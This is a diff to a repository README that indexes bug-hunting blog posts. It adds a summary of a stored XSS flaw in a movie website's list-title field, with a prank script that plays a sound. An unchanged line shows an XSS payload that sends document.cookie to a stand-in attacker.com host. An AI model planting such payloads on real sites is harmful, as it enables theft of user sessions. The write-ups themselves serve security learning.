@@ -32,9 +32,18 @@ This repository serves as a collection of insightful and informative blog posts 
 
   ``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``
 
-- Humorous XSS Vulnerabilities in a Movie Website
+- **[Humorous XSS Vulnerabilities in a Movie Website](https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661)**
 
-  https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661
+  The system’s logic involves creating a new list from the “Create New List” section in the user profile, naming it, and then adding movies and TV series to curate a personalized list.
+
+  This list is then published on your profile. However, due to a critical oversight by the developers, it’s possible to upload XSS payloads into the list’s title field using a simple trick.
+
+  ``<script>
+    document.body.addEventListener('click', () => 
+    setTimeout(() => 
+        new Audio('https://www.myinstants.com/media/sounds/among-us-role-reveal-sound.mp3').play(), 2000), 
+    { once: true });
+    </script>``
 
 - A New Bug Hunting Story: Open Redirection Vulnerability
 
